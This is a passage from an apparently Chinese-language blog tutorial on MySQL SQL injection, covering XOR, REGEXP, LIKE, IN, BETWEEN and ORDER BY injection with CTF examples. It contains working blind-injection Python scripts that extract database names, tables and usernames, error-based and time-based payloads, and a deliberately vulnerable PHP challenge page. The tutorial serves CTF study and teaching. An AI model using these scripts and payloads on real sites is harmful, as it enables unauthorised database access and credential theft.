class="hljs-string">&#x27;girl&#x27;</span>) == -<span class="hljs-number">1</span>:<br>            result += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(j)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<p>这是<code>[CISCN2019 华北赛区 Day2 Web1]Hack World</code>所需脚本，其中就使用了异或注入payload</p>
<p>使用场景：</p>
<p>过滤了<code>and or</code>   <code>,（逗号）</code> <code>空格</code></p>
<h3 id="REGEXP注入"><a href="#REGEXP注入" class="headerlink" title="REGEXP注入"></a>REGEXP注入</h3><p>就是regexp正则注入</p>
<ol>
<li><h4 id="基本注入"><a href="#基本注入" class="headerlink" title="基本注入"></a>基本注入</h4></li>
</ol>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> 语句) regexp <span class="hljs-string">&#x27;正则&#x27;</span><br></code></pre></td></tr></table></figure>

<p>a.正则注入</p>
<p>当匹配则返回1，未匹配则返回0</p>
<p><img src="https://s3.ax1x.com/2020/12/25/rWMEsU.png" alt="faw"></p>
<p><img src="https://s3.ax1x.com/2020/12/25/rWMmdJ.png" alt="gr"></p>
<p>所以username里面第一个字符为1</p>
<p>b.regexp代替where里面的 =</p>
<p><img src="https://s3.ax1x.com/2020/12/25/rWl1bD.png" alt="gdr"></p>
<p>若<code> ^</code>被过滤了，我们也可以使用<code> $</code>来从后往前进行匹配</p>
<p><img src="https://s3.ax1x.com/2020/12/25/rW31tH.png" alt="gerd"></p>
<p>c.在联合注入中使用</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>union select <span class="hljs-number">1</span>,database() regexp <span class="hljs-comment">&#x27;^s&#x27;,3 --+</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><h4 id="REGEXP盲注"><a href="#REGEXP盲注" class="headerlink" title="REGEXP盲注"></a>REGEXP盲注</h4><p>payload:</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27; or database() regexp &#x27;^s&#x27;--+<br></code></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>strs = string.printable<br>url = <span class="hljs-string">&quot;...?id=&quot;</span><br><br>database1 = <span class="hljs-string">&quot;&#x27; or database() regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br>table1 = <span class="hljs-string">&quot;&#x27; or (select table_name from information_schema.tables where table_schema=database()limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br>cloumn1 = <span class="hljs-string">&quot;&#x27; or (select cloumn_name from information_schema.cloumns where table_name=&#x27;&#x27; and table_schema=database()limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br>data1 = <span class="hljs-string">&quot;&#x27; or (select username from users limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><br>payload = database1<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>        char = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br>            payloads = payload.<span class="hljs-built_in">format</span>(name+j)<br>            urls = url+payloads<br>            r = requests.get(urls)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                name += j<br>                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                char = j<br>                <span class="hljs-keyword">break</span><br>         <span class="hljs-keyword">if</span> char == <span class="hljs-string">&#x27;#&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p>使用场景：</p>
<p>过滤了<code>= in like</code></p>
</li>
</ol>
<p>这里还有一个小<code>trick</code>，就是在注入语句后面添加<code>regexp+正则表达式</code>来过滤查询出的内容：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span>(group_concat(real_flag_1s_here))<span class="hljs-keyword">from</span>(users)<span class="hljs-keyword">where</span>(real_flag_1s_here)regexp(<span class="hljs-string">&#x27;^f&#x27;</span>))),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure>

<p>筛选出以f开头的结果</p>
<h3 id="LIKE注入"><a href="#LIKE注入" class="headerlink" title="LIKE注入"></a>LIKE注入</h3><ol>
<li><p>基本注入</p>
<p>a.<code>like &#39;wo%&#39;</code>判断前面两个字符是否为wo</p>
<p>​    <img src="https://s3.ax1x.com/2020/12/25/rWaBpF.png" alt="grhs"></p>
<p>b.<code>like &#39;%wo%&#39;</code>判断是否包含wo这两个字符</p>
<p><img src="https://s3.ax1x.com/2020/12/25/rWaXh8.png" alt="hgrd"></p>
<p>c.<code>like &#39;_ _ _ _ _&#39;</code>判断是否为5个字符</p>
<p>d.<code>like &#39;w_ _ _ _&#39;</code>判断第一个是否为w</p>
</li>
<li><p>LIKE盲注</p>
<p>payload:</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27; <span class="hljs-keyword">or</span> database() like <span class="hljs-symbol">&#x27;s</span>%&#x27;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>strs = string.printable<br>url = <span class="hljs-string">&quot;.............id=&quot;</span><br><br>database1 = <span class="hljs-string">&quot;&#x27; or database() like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br>table1 = <span class="hljs-string">&quot;&#x27; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br>cloumn1 = <span class="hljs-string">&quot;&#x27; or (select column_name from information_schema.columns where table_name=\&quot;users\&quot; and table_schema=database() limit 1,1) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br>data1 = <span class="hljs-string">&quot;&#x27; or (select username from users limit 0,1) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><br>payload = database1<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>        char = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br>            payloads = payload.<span class="hljs-built_in">format</span>(name+j)<br>            urls = url+payloads<br>            r = requests.get(urls)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                name += j<br>                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                char = j<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> char ==<span class="hljs-string">&#x27;#&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure></li>
</ol>
<h3 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h3><p>在过滤等号或者过滤like等的sql注入情况下IN很有用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id in (1,2);<br>+----+----------+------------+<br>| id | username | password   |<br>+----+----------+------------+<br>|  1 | Dumb     | Dumb       |<br>|  2 | Angelina | I-kill-you |<br>+----+----------+------------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select substr(&#39;abc&#39;,1,1) in (&#39;z&#39;);<br>+----------------------------+<br>| substr(&#39;abc&#39;,1,1) in (&#39;z&#39;) |<br>+----------------------------+<br>|                          0 |<br>+----------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select substr(&#39;abc&#39;,1,1) in (&#39;a&#39;);<br>+----------------------------+<br>| substr(&#39;abc&#39;,1,1) in (&#39;a&#39;) |<br>+----------------------------+<br>|                          1 |<br>+----------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>



<h3 id="Between"><a href="#Between" class="headerlink" title="Between"></a>Between</h3><p>BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id between 1 and 3;<br>+----+----------+------------+<br>| id | username | password   |<br>+----+----------+------------+<br>|  1 | Dumb     | Dumb       |<br>|  2 | Angelina | I-kill-you |<br>|  3 | Dummy    | p@ssword   |<br>+----+----------+------------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select * from users where username between &#39;sa&#39; and &#39;sz&#39;;<br>+----+----------+-----------+<br>| id | username | password  |<br>+----+----------+-----------+<br>|  4 | secure   | crappy    |<br>|  5 | stupid   | stupidity |<br>|  6 | superman | genious   |<br>+----+----------+-----------+<br>3 rows in set (0.00 sec)<br><br>还支持16进制<br>mysql&gt; select * from users where username between 0x7365 and 0x737a;<br>+----+----------+-----------+<br>| id | username | password  |<br>+----+----------+-----------+<br>|  4 | secure   | crappy    |<br>|  5 | stupid   | stupidity |<br>|  6 | superman | genious   |<br>+----+----------+-----------+<br>3 rows in set (0.00 sec)<br><br>可以结合字符串截取进行盲注<br>mysql&gt; select * from users where substr(username,1,1) between &#39;a&#39; and &#39;d&#39;;<br>+----+----------+------------+<br>| id | username | password   |<br>+----+----------+------------+<br>|  1 | Dumb     | Dumb       |<br>|  2 | Angelina | I-kill-you |<br>|  3 | Dummy    | p@ssword   |<br>|  7 | batman   | mob!le     |<br>|  8 | admin    | admin      |<br>+----+----------+------------+<br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>



<h3 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h3><p>首先，order by作用：</p>
<p>就是对查询数据进行排列的方法，例如：</p>
<p><img src="https://s3.ax1x.com/2020/12/25/rfu8RP.png" alt="re"></p>
<p>可以发现，它是按照第一列id从小到大排列的</p>
<p><img src="https://s3.ax1x.com/2020/12/25/rfuDGq.png" alt="hr"></p>
<p>可以发现，它是按照第二列username从小到大排列的</p>
<p>以上就可以知道order by的用法了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 列名(或者数字) <span class="hljs-keyword">asc</span>；升序(默认升序)<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 列名(或者数字) <span class="hljs-keyword">desc</span>；降序<br></code></pre></td></tr></table></figure>

<p>order by 盲注后台sql查询语句：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> $id<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>

<p>我们可以通过 asc 和 desc 来判断是否存在order by注入漏洞，因为 asc 和 desc 排列方式不同，如果我们输入这个改变了排列方式，那么说明我们写入的东西在order by 后面。</p>
<p><img src="https://s3.ax1x.com/2020/12/26/rf6gde.png" alt="ger"></p>
<p><img src="https://s3.ax1x.com/2020/12/26/rf6fJA.png" alt="gr"></p>
<ol>
<li><p>报错注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">直接在<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>后面加语句：<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> (<span class="hljs-keyword">SELECT</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>))) 进行报错注入<br></code></pre></td></tr></table></figure></li>
<li><p>rand()方式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">rand()会返回一个<span class="hljs-number">0</span>和<span class="hljs-number">1</span>之间的随机数，如果参数被赋值，同一个参数会返回同一个数。<br>这里就可以用布尔盲注的方式来进行注入<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(mid(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">5</span>)<br>当然这里也可以用时间盲注的方式。<br></code></pre></td></tr></table></figure></li>
<li><p>时间盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">在<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>后面的不会根据计算的结果来排序，但是当我们的payload有延迟命令的时候，页面还是会延迟的。<br><br>使用<span class="hljs-keyword">and</span>连接时间延迟payload：<br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (If(substr(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">5</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)))<br></code></pre></td></tr></table></figure></li>
<li><p>配合union select 进行注入</p>
<p>原理：我们目的是读取F1ag里面的那串16加密的字符</p>
<p><img src="https://s3.ax1x.com/2020/12/26/rfb8QU.png" alt="gre"></p>
<p>然后对第二列排列：</p>
<p><img src="https://s3.ax1x.com/2020/12/26/rfqtc8.png" alt="grs"></p>
<p>当我们在union select后面那里的2换为6会发生什么呢：</p>
<p><img src="https://s3.ax1x.com/2020/12/26/rfqI41.png" alt="fse"></p>
<p>发现没啥变化，还是开始查询那个在第一行，但是当我们把再换一个呢：</p>
<p><img src="https://s3.ax1x.com/2020/12/26/rfqODe.png" alt="gser"></p>
<p>可以发现想读取的东西就提到第一行了，所以这里经常用来判断有返回差异的注入，且返回只有一列的输出，根据差异来判断我们盲注的值是否正确</p>
<p>分析上面，就是当我们在第二个位置的地方输入正确的字符时，输入的就会提到第一个，当错误的时候，想读取的东西就提到第一行了</p>
<p>适用场景：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">过滤了列名<br>过滤了括号<br>适用于已知该表的列名以及列名位置的注入<br></code></pre></td></tr></table></figure>



<p>下面是三之师傅出的一道order by 注入的ctf，和上面讲的方法一致：</p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;root&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . mysqli_error());<br>&#125;<br>mysqli_select_db(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please tell me the id , And you should think what is the sort way.&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-comment">//echo strtolower($id).&quot;&lt;br/&gt;&quot;;</span><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/(char|hex|conv|lower|lpad|into|password|md5|encode|decode|convert|cast)/i&#x27;</span>,strtolower(<span class="hljs-variable">$id</span>)) != <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//|\s</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoNoNo&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;F1ag&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Close, but No!!! Thinking...&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;;&quot;</span>;<br><span class="hljs-variable">$retval</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$retval</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;???&#x27;</span>);<span class="hljs-comment">// . mysqli_error($conn)</span><br>&#125;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_array(<span class="hljs-variable">$retval</span>, MYSQLI_ASSOC))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt; id: <span class="hljs-subst">&#123;$row[&#x27;id&#x27;]&#125;</span> &lt;/td&gt; &quot;</span>.<br>         <span class="hljs-string">&quot;&lt;td&gt; name: <span class="hljs-subst">&#123;$row[&#x27;username&#x27;]&#125;</span> &lt;/td&gt; &lt;br/&gt;&quot;</span>.<br>         <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;<br>&#125;<br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>sql:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> NAMES utf8mb4;<br><span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Table structure for this_1s_th3_fiag_tab13</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `this_1s_th3_fiag_tab13`;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `this_1s_th3_fiag_tab13`  (<br>  `id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `F1ag` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `password` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span><br>) ENGINE <span class="hljs-operator">=</span> MyISAM <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8_general_ci ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;<br><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Records of this_1s_th3_fiag_tab13</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `this_1s_th3_fiag_tab13` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;666C61677B643067335F74687265657A68317D&#x27;</span>, <span class="hljs-string">&#x27;threezh1&#x27;</span>, <span class="hljs-string">&#x27;You is pig&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `this_1s_th3_fiag_tab13` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;No the Flag&#x27;</span>, <span class="hljs-string">&#x27;oops,This is not the flag id&#x27;</span>, <span class="hljs-string">&#x27;You is pig&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `this_1s_th3_fiag_tab13` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;No the Flag&#x27;</span>, <span class="hljs-string">&#x27;Not the flag also&#x27;</span>, <span class="hljs-string">&#x27;You is pig&#x27;</span>);<br><br><span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<p>已知：数据库名：users，表名：this_1s_th3_fiag_tab13，字段名：F1ag，列号为2</p>
<p>因为我们想读取第二列里面得数据，所以就在第二列那里修改数据就好</p>
<p>所以构造payload：</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">?id=<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;字符&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>返回：<br>id: <span class="hljs-number">1</span><span class="hljs-built_in"> name</span>: <span class="hljs-number">3</span><br>id: <span class="hljs-number">3</span><span class="hljs-built_in"> name</span>: threezh1<br><span class="hljs-built_in">?id</span>=<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>返回：<br>id: <span class="hljs-number">3</span><span class="hljs-built_in"> name</span>: threezh1<br>id: <span class="hljs-number">1</span><span class="hljs-built_in"> name</span>: <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>

